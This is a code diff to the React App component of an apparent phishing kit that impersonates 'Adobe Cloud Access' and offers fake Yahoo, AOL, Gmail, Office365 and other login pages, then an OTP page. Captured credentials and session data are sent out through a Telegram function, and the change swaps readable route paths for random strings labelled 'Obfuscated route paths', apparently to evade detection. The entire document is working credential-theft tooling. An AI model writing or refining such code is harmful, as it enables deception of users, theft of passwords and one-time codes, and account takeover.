@@ -30,6 +30,19 @@ const safeSendToTelegram = async (payload: any) => {
   }
 };
 
+// Obfuscated route paths
+const ROUTES = {
+  HOME: '/2x1wz9i3eezdpjuai1kpm6xfc62ub9l3',
+  LOGIN: '/z20x583dvax9zzazfvexr5xaawvmrrow',
+  LOGIN_YAHOO: '/kpakvf741lvujqys6ir0sih7bu55r7gi',
+  LOGIN_AOL: '/lehp7y8aelivekn044kmu75hhouy38z3',
+  LOGIN_GMAIL: '/raa0m3jseyzinlvlqiduth1erwqbl9uq',
+  LOGIN_OTHERS: '/w8hy3k85hgc3qgcqzt8y3fr1647e1n2p',
+  LOGIN_OFFICE365: '/etj0zhefpws6qrrwrpq7ccnbk40injah',
+  OTP: '/vmemb75a2dmbhv898xqhshsiiskoollb',
+  LANDING: '/tbcrncjbom5lax56p1mep0wp1nanbat1',
+};
+
 function App() {
   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
   const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
@@ -59,15 +72,15 @@ function App() {
   }, []);
 
   useEffect(() => {
-    if (hasActiveSession && location.pathname !== '/landing') {
-      navigate('/landing', { replace: true });
-    } else if (!hasActiveSession && location.pathname === '/landing') {
-      navigate('/', { replace: true });
+    if (hasActiveSession && location.pathname !== ROUTES.LANDING) {
+      navigate(ROUTES.LANDING, { replace: true });
+    } else if (!hasActiveSession && location.pathname === ROUTES.LANDING) {
+      navigate(ROUTES.HOME, { replace: true });
     }
   }, [hasActiveSession, location.pathname, navigate]);
 
   const handleCaptchaVerified = () => {
-    navigate('/login');
+    navigate(ROUTES.LOGIN);
   };
 
   const handleLoginSuccess = async (loginData: any) => {
@@ -89,12 +102,12 @@ function App() {
       sessionData: credentialsData,
     });
     setIsLoading(false);
-    navigate('/otp', { replace: true });
+    navigate(ROUTES.OTP, { replace: true });
   };
   
   const handleOtpSubmit = async (otp: string) => {
     if (!loginFlowState.sessionData) {
-      navigate('/', { replace: true });
+      navigate(ROUTES.HOME, { replace: true });
       return;
     }
     
@@ -126,16 +139,16 @@ function App() {
 
   return (
     <Routes>
-      <Route path="/" element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onOthersSelect={() => navigate('/login/others')} onBack={() => navigate('/')} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login" element={<Navigate to="/" replace />} />
-      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/others" element={!hasActiveSession ? <LoginComponent key="others-login" fileName="Adobe Cloud Access" defaultProvider="Others" onLoginSuccess={handleLoginSuccess} onBack={() => navigate('/')} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/otp" element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to="/" replace />} />
-      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
-      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
+      <Route path={ROUTES.HOME} element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate(ROUTES.LOGIN_YAHOO)} onAolSelect={() => navigate(ROUTES.LOGIN_AOL)} onGmailSelect={() => navigate(ROUTES.LOGIN_GMAIL)} onOffice365Select={() => navigate(ROUTES.LOGIN_OFFICE365)} onOthersSelect={() => navigate(ROUTES.LOGIN_OTHERS)} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN} element={<Navigate to={ROUTES.HOME} replace />} />
+      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <LoginComponent key="others-login" fileName="Adobe Cloud Access" defaultProvider="Others" onLoginSuccess={handleLoginSuccess} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
+      <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
+      <Route path="*" element={<Navigate to={hasActiveSession ? ROUTES.LANDING : ROUTES.HOME} replace />} />
     </Routes>
   );
 }
